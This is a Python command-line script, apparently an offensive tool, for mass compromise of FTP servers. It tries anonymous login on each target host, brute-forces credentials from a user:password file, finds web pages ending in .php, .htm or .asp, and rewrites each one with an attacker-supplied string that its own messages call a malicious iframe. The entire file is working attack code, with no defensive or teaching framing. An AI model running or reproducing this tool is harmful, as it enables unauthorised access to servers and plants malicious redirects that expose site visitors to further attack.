import ftplib
import argparse
import time


def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except:
        print('[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
        return False


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: '+userName+'/'+passWord)
            ftp.quit()
            return (userName, passWord)
        except:
            pass
    print('[-] Could not brute force FTP credentials.')
    return (None, None)


def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return

    if len(dirList) == 0:
        print('[-] Files not found.')
        return []

    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
            retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)

    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)


def attack(username,password,tgtHost,redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    if len(defPages) == 0:
        print('[-] No infectable files.')
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    parser = argparse.ArgumentParser(description='mass comprise of ftp servers')
    parser.add_argument('-H', dest='tgtHosts',type=str, help='specify target host',required=True)
    parser.add_argument('-f', dest='passwdFile',type=str, help='specify user/password file')
    parser.add_argument('-r', dest='redirect',type=str,help='specify a redirection page',required=True)

    args = parser.parse_args()
    tgtHosts = str(args.tgtHosts).split(',')
    passwdFile = args.passwdFile
    redirect = args.redirect

    for tgtHost in tgtHosts:
        username = None
        password = None

        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, tgtHost, redirect)
      
        elif passwdFile != None:
            (username, password) =bruteLogin(tgtHost, passwdFile)
            if password != None:
                print('[+] Using Creds: ' + username + '/' + password + ' to attack')
                attack(username, password, tgtHost, redirect)


if __name__ == '__main__':
    main()
